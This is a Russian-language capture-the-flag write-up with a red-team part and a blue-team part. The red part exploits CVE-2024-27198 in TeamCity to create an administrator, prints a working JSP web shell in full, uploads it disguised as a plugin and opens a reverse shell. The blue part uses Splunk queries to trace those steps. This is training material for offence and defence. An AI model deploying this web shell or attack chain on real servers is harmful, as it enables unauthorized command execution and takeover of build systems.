Открыты 3 порта.
```
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up)
```

Запустим более подробное сканирование. После него мы видим что перед нами два веб сервера и ssh.
```
Host is up (0.0097s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e1:c1:db:62:54:6d:0f:62:5b:16:69:c1:13:08:98:ea (RSA)
|   256 3c:e2:c3:55:13:42:28:3d:ab:1f:39:f8:ed:a1:76:57 (ECDSA)
|_  256 56:2e:24:a5:fc:e6:53:eb:72:aa:c8:d8:21:5c:fb:1e (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.41 (Ubuntu)
50000/tcp open  http    Apache Tomcat (language: en)
|_http-title: TeamCity Maintenance &mdash; TeamCity
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up)
```

Изучаем первый веб-сервер. Там ничего интересного нет.

![](../images/Pasted%20image%2020260529131644.png)

Второй веб-сервер представляет форму входа в TeamCity

![](../images/Pasted%20image%2020260529132053.png)

Мы можем увидеть версию продукта
```
Version 2023.11.3 (build 147512)
```

Изучив её, я нашел, что у нее есть очень жесткая уязвимость **CVE-2024-27198**, позволяющая даже без регистрации создать аккаунт с правами администратора.

Есть эксплоит на пайтоне, для создания администратора:

![](../images/Pasted%20image%2020260529133724.png)

Скачиваем и проверяем работоспособность

![](../images/Pasted%20image%2020260529134040.png)

Введя те же данные, получается зайти в новый аккаунт администратора

![](../images/Pasted%20image%2020260529134142.png)

Далее я создал веб-шел на java

```
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStreamReader reader = new java.io.InputStreamReader(p.getInputStream());
        java.io.BufferedReader buffer = new java.io.BufferedReader(reader);
        String line = "";
        while ((line = buffer.readLine()) != null) {
            out.println(line + "<br>");
        }
        out.flush();
    }
%>
```

Создал архив, который подражал плагину TeamCity

![](../images/Pasted%20image%2020260529140140.png)

Загружаем плагин на портал

![](../images/Pasted%20image%2020260529140213.png)

Всё получилось, активируем его. И переходим на этот плагин и триггерим реверс шелл.

![](../images/Pasted%20image%2020260529140423.png)

Принимаем входящее соединение

![](../images/Pasted%20image%2020260529141901.png)

Читаем флаг. Задание за красную команду решено.

![](../images/Pasted%20image%2020260529142140.png)

Далее идет задание за синюю команду. Заходим на splunk

![](../images/Pasted%20image%2020260529142916.png)

Ищем имя пользователя, который создавал злоумышленник
```
index=* "new user"
```

![](../images/Pasted%20image%2020260529151346.png)

Ищем пакет, который установил злоумышленник после попадания в систему
```
index=* source="/var/log/dpkg.log" "installed"
```

![](../images/Pasted%20image%2020260529151559.png)

Ищем плагин, который использовал злоумышленник

![](../images/Pasted%20image%2020260529143431.png)

Задания решены.
